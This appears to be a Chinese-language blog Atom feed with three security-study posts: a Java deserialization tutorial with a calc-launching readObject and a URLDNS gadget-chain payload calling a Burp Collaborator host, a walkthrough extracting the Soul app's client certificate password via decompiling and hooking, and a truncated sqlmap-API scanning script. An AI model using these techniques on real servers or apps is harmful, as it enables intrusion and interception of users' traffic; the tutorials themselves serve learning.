<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-09-21T09:22:49.977Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>java反射和URLDNS链分析</title>
    <link href="http://example.com/2021/09/21/java%E5%8F%8D%E5%B0%84%E5%92%8CURLDNS%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2021/09/21/java%E5%8F%8D%E5%B0%84%E5%92%8CURLDNS%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2021-09-21T09:21:56.000Z</published>
    <updated>2021-09-21T09:22:49.977Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3><p>java反序列化很复杂，一步一步看看究竟是怎么个原理。这篇文章的老师是B站up主-白日梦组长</p><hr /><h4 id="简单反序列化"><a class="markdownIt-Anchor" href="#简单反序列化"></a> 简单反序列化</h4><p>首先定义一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age =age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name =&#x27;&quot;</span> + name +<span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">action</span><span class="params">(String act)</span></span>&#123;</span><br><span class="line">        System.out.println(act);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span>  java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span>  IOException</span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">&quot;aa&quot;</span>,<span class="number">22</span>);</span><br><span class="line"><span class="comment">//        System.out.println(person);</span></span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnserializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">static</span>  Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">        Person person = (Person) unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的代码最主要的是两段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span>  IOException</span>&#123;</span><br><span class="line">       ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">       oos.writeObject(obj);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里定义了一个反序列化方法serialize, 新建一个ObjectOutputStream类oos，传入对象，通过FileOutputStream把传入的对象输出到ser.bin内，在通过调用oos的writeObject方法将对象序列化。</p><p>注意第一段在定义类时，public class Person implements Serializable ，有一个接口</p><p>Serializable当注释掉接口时，是无法进行反序列化的。</p><hr /><p>为什么会产生安全问题？</p><p>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p><p>可能的形式：</p><p>1、入口类的readObject直接调用危险方法</p><p>2、入口类参数中包含可控类，该类有危险方法，readObject时调用</p><p>3、入口类参数中包含可控类,该类又调用其他危险方法的类，readObject时调用</p><hr /><p>一、入口类的readObject直接调用危险方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">    ois.defaultReadObject();</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Person类内重写readobject方法，加入以上代码，反序列化是就会直接弹出计算器。</p><p>这种情况几乎没有。</p><p>二、入口类参数中包含可控类，该类有危险方法，readObject时调用</p><p>寻找入口类，这一种类要满足几个条件：(1)  继承了Serializable (2) 重写了readObject，在内部调用了一个常见的函数 (3)参数类型广泛(4) 最好JDK自带，比如MAP类</p><p>然后寻找调用链(gadget chain)相同名称，相同类型的父类，</p><p>最后找执行类，确定造成什么漏洞</p><hr /><h4 id="java反射"><a class="markdownIt-Anchor" href="#java反射"></a> java反射</h4><p><strong>什么是java反射？</strong></p><p>反射（Reflection）允许程序在执行期借助于Reflection API取得任何类的內部信息，并能直接操作任意对象的内部属性及方法。</p><p>我的理解就是原本是根据类来实例化对象，对象的方法继承自父类。拥有反射机制的我们，可以根据这个已经实例化的对象，通过Reflection API来获取对象的类的属性，方法，并可以对他们进行操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectionTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        Class c =person.getClass(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Class 和 class 有什么区别？ 我的理解是就是描述类的类？比如person.class，other.class等都属于Class。Class带有的Methon，Filed，Constructor等用来获取。反射的所有操作就是针对Class</p><ul><li><p>从原型class实例化对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 把对象的类具体化。获取对象所属的类的构造函数</span></span><br><span class="line">Constructor personconstructor = c.getConstructor(String.class,<span class="keyword">int</span>.class);</span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line">Person p = (Person) personconstructor.newInstance(<span class="string">&quot;abc&quot;</span>,<span class="number">22</span>); </span><br></pre></td></tr></table></figure></li><li><p>获取类里的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Field[] personfileds = c.getFields();<span class="comment">//获取person类的属性返回一个数组</span></span><br><span class="line">Field[] personfileds = c.getDeclaredFields();<span class="comment">//获取person类的属性返回一个数组b包括私有属性</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取并改变对象的属性，年龄被改成33</span></span><br><span class="line">Field namefield = c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">namefield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">namefield.set(p,<span class="number">33</span>);</span><br></pre></td></tr></table></figure></li><li><p>调用类里的方法actionmethod.invoke(p,“fasdfasf”);</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取类里的方法 到personmehton数组</span></span><br><span class="line">Method[] personmethod = c.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取函数的action方法 这个方法需要的参数是String类型的</span></span><br><span class="line">Method actionmethod = c.getMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line"><span class="comment">// 使用invoke方法调用函数</span></span><br><span class="line">actionmethod.invoke(p,<span class="string">&quot;fasdfasf&quot;</span>);</span><br></pre></td></tr></table></figure><hr /><h3 id="ysoserial反序列化工具urldns分析"><a class="markdownIt-Anchor" href="#ysoserial反序列化工具urldns分析"></a> ysoserial反序列化工具–URLDNS分析</h3><p>ysoserial是款很强大的反序列化工具，根据上面所述，对其中的URLDNS进行分析。</p><p>根据前面讲的，我们首先需要一个强大的入口类，他可以传递很多类型的参数，继承了Serializable，重写了readObject，java自带。这里借助的就是hashmap类</p><p>首先是关于hashmap:</p><p><a href="https://imgtu.com/i/4YJPMt"><img src="https://z3.ax1x.com/2021/09/21/4YJPMt.png" alt="4YJPMt.png" /></a></p><p>hashmap需要传入一对键值，由hashmap的key进行hash计算时，如果key为URL类的对象，则调用key.hashcode实际为调用了URL类对象的hashcode。</p><p><a href="https://imgtu.com/i/4YJuzn"><img src="https://z3.ax1x.com/2021/09/21/4YJuzn.png" alt="4YJuzn.png" /></a></p><p>URL类的hashcode,可以看到hashcode如果等于-1就会进入handler内的hashcode方法</p><p><a href="https://imgtu.com/i/4YJOln"><img src="https://z3.ax1x.com/2021/09/21/4YJOln.png" alt="4YJOln.png" /></a></p><p>这时候就会调用函数根据域名获取地址。做一个域名解析。</p><hr /><h3 id="idea调试"><a class="markdownIt-Anchor" href="#idea调试"></a> IDEA调试</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="comment">//        Person person = new Person(&quot;aa&quot;,22);</span></span><br><span class="line"><span class="comment">//        System.out.println(person);</span></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> HashMap&lt;URL, Integer&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;HTTP://ecu5t8psotdkhhlgfae16al1mssig7.burpcollaborator.net&quot;</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们在SerializationTest新建一个hashmap对象，用put方法传入用burp生成的url（类似DNSlog），put传入的两个值，第一个参数作为key计算hash码，如果算出的key值不是null，就将算出的值覆盖value，反之就保留value的值。将hashmap序列化。我们在burp看到，返回记录 。</p><p><a href="https://imgtu.com/i/4YBEdI"><img src="https://z3.ax1x.com/2021/09/21/4YBEdI.png" alt="4YBEdI.png" /></a></p><p>这里我们还没有反序列化就执行了，为什么？</p><p>调用URL类对象的hashcode时，hashcode会初始化为-1，会直接调用后面的函数，因此我们需要在序列化之前将hashcode的值设置成不是-1，在反序列化时再改回-1。这里就需要使用反射。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="comment">//        Person person = new Person(&quot;aa&quot;,22);</span></span><br><span class="line"><span class="comment">//        System.out.println(person);</span></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> HashMap&lt;URL, Integer&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;HTTP://a9kd16wf12a011enkkytrkvn0e64ut.burpcollaborator.net&quot;</span>);</span><br><span class="line">        <span class="comment">//  反射，先把hashcode的值改成不是-1</span></span><br><span class="line">        Class c = url.getClass();</span><br><span class="line">        Field hashcodefield = c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashcodefield.set(url, <span class="number">12</span>);</span><br><span class="line">        <span class="comment">// 传入url</span></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 再把hashcode的值改回-1</span></span><br><span class="line">        hashcodefield.set(url, -<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此时我们在序列化时就不会触发dnslog，在反序列化时触发了dnslog</p><p><a href="https://imgtu.com/i/4Yco7Q"><img src="https://z3.ax1x.com/2021/09/21/4Yco7Q.png" alt="4Yco7Q.png" /></a></p><h3 id="回顾"><a class="markdownIt-Anchor" href="#回顾"></a> 回顾</h3><p>整个流程如下：</p><ul><li><p>找到HashMap的接口，使用PUT方法传入两个参数，第一个数就是URL类对象，第二个值任意。</p><p>这里需要明确HashMap传入的第一个值作为key，put进去的key会被作为参数传递给hash()，hash会返回一个值，调用的是key自带的hashCode方法。</p></li><li><p>此时就调用了URL的hashCode方法，如果hashCode的值是-1就会进入handler.hashCode()，进入之后，就根据URL获取一个地址，也就是最后的执行点。</p></li></ul><p>这里的入口是A(HashMap)，接受参数O。我们的目标是B(URL)，是为了调用B的f方法，因此我们将B作为参数传递给A，这里就需要O和B的f方法是同名的。（有点移花接木的感觉）</p><p>A.readObject -&gt; O.f -&gt; B.f</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h3&gt;
&lt;p&gt;java反序列化很复杂，一步一步看看究竟是怎么个原理。这篇文章的老师是B站up主-白日梦组长&lt;/p&gt;
&lt;hr /&gt;
&lt;h4 id=&quot;简单反序列化</summary>
      
    
    
    
    
    <category term="java反序列化" scheme="http://example.com/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>soulapp证书的逆向寻找</title>
    <link href="http://example.com/2021/09/20/soulapp%E8%AF%81%E4%B9%A6%E7%9A%84%E9%80%86%E5%90%91%E5%AF%BB%E6%89%BE/"/>
    <id>http://example.com/2021/09/20/soulapp%E8%AF%81%E4%B9%A6%E7%9A%84%E9%80%86%E5%90%91%E5%AF%BB%E6%89%BE/</id>
    <published>2021-09-20T13:02:01.000Z</published>
    <updated>2021-09-20T13:09:46.734Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3><p>在使用burp抓移动端的soulapp的包时，抓包失败。因为存在证书验证，要抓包就要写在burp内导入证书，但是证书是带密码的，因此就要先找到密码才有后续</p><h4 id="gda和idapro获取证书密码"><a class="markdownIt-Anchor" href="#gda和idapro获取证书密码"></a> GDA和IDApro获取证书密码</h4><p>（1）在GDA中打开soul的apk文件，并搜索.p12</p><p><img src="https://s3.ax1x.com/2020/12/18/rYplQS.jpg" alt="yeah" /></p><p>（2）双击进入，找到client.p12</p><p><img src="https://s3.ax1x.com/2020/12/18/rYpgF1.png" alt="yeah" /></p><p>（3）对相关的java代码进行查询分析，知道密码是“v1.toCharArray()”</p><p><img src="https://s3.ax1x.com/2020/12/18/rYpv6S.png" alt="yeah" /></p><p>(4) 向上寻找密码来源，发现最终调用的是非java代码：</p><p><img src="https://s3.ax1x.com/2020/12/18/rY9MkR.png" alt="yeah" /></p><p><img src="https://s3.ax1x.com/2020/12/18/rY9lfx.png" alt="yeah" /></p><p><img src="https://s3.ax1x.com/2020/12/18/rY9JXD.png" alt="yeah" /></p><p>（5）查询初始化位置，看到导入了soul-netsdk</p><p><img src="https://s3.ax1x.com/2020/12/18/rY927j.png" alt="yeah" /></p><p>（6）在soul文件夹中找到soul-netsdk.so文件，在IDA中打开，并搜索调用的函数，找到疑似密码的值：</p><p><img src="https://s3.ax1x.com/2020/12/18/rYCvZQ.png" alt="yeah" /></p><p>（7）使用java在线编程，处理可疑值，并尝试导入证书：</p><p><img src="https://s3.ax1x.com/2020/12/18/rYPuJ1.jpg" alt="yeah" /></p><p><img src="https://s3.ax1x.com/2020/12/18/rYP4yT.jpg" alt="yeah" /></p><p><img src="https://s3.ax1x.com/2020/12/18/rYPomF.jpg" alt="yeah" /></p><h4 id="hook证书密码"><a class="markdownIt-Anchor" href="#hook证书密码"></a> HOOK证书密码</h4><p>（1）下载xposed  安装框架，添加Inspeckage模块。</p><p>（2）在本机逍遥模拟器adb.exe所在的目录下打开命令行窗口，连接到逍遥模拟器，并设置端口转发：</p><p><img src="https://s3.ax1x.com/2020/12/18/rYij4s.png" alt="yeah" /></p><p>（3）在Inspeckage模块选择soul，同时在本地浏览器打开127.0.0.1:8008 可以看到：</p><p><img src="https://s3.ax1x.com/2020/12/18/rYkAL8.png" alt="yeah" /></p><p><img src="https://s3.ax1x.com/2020/12/18/rYkywD.png" alt="yeah" /></p><p>（4）设置HOOK：</p><p><img src="https://s3.ax1x.com/2020/12/18/rYk7Tg.png" alt="yeah" /></p><p>（5）：Launch app点击 ，发起请求：</p><p><img src="https://s3.ax1x.com/2020/12/18/rYAV6x.png" alt="yeah" /></p><p>（6）最后得到结果<img src="https://s3.ax1x.com/2020/12/14/rm75TK.png" alt="rm75TK.png" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h3&gt;
&lt;p&gt;在使用burp抓移动端的soulapp的包时，抓包失败。因为存在证书验证，要抓包就要写在burp内导入证书，但是证书是带密码的，因此就要先找到密</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>python编写利用sqlmap-api的检测脚本</title>
    <link href="http://example.com/2021/09/20/python%E7%BC%96%E5%86%99%E5%88%A9%E7%94%A8sqlmap-api%E7%9A%84%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/"/>
    <id>http://example.com/2021/09/20/python%E7%BC%96%E5%86%99%E5%88%A9%E7%94%A8sqlmap-api%E7%9A%84%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/</id>
    <published>2021-09-20T12:21:06.000Z</published>
    <updated>2021-09-20T12:57:38.244Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,server_ip,server_port,admin_token=<span class="string">&quot;&quot;</span>,taskid=<span class="string">&quot;&quot;</span>,filepath=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.server = <span class="string">&quot;http://&quot;</span> + server_ip + <span class="string">&quot;:&quot;</span> + server_port</span><br><span class="line">        self.admin_token = admin_token</span><br><span class="line">        self.taskid = taskid</span><br><span class="line">        self.filepath = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.status = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.scan_start_time = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.scan_end_time = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.engineid=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">create_new_task</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;创建一个新的任务，创建成功返回taskid&#x27;&#x27;&#x27;</span></span><br><span class="line">        r = requests.get(<span class="string">&quot;%s/task/new&quot;</span>%(self.server))</span><br><span class="line">        self.taskid = r.json()[<span class="string">&#x27;taskid&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> self.taskid != <span class="string">&quot;&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.taskid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;创建任务失败!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_task_options</span>(<span class="params">self,url</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;设置任务扫描的url等&#x27;&#x27;&#x27;</span></span><br><span class="line">        self.filepath = url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_target_scan</span>(<span class="params">self,url</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;开始扫描的方法,成功开启扫描返回True，开始扫描失败返回False&#x27;&#x27;&#x27;</span></span><br><span class="line">        r = requests.post(self.server + <span class="string">&#x27;/scan/&#x27;</span> + self.taskid + <span class="string">&#x27;/start&#x27;</span>,</span><br><span class="line">                      data=json.dumps(&#123;<span class="string">&#x27;url&#x27;</span>:url,<span class="string">&#x27;getCurrentUser&#x27;</span>:<span class="literal">True</span>,<span class="string">&#x27;getBanner&#x27;</span>:<span class="literal">True</span>,<span class="string">&#x27;getCurrentDb&#x27;</span>:<span class="literal">True</span>&#125;),</span><br><span class="line">                      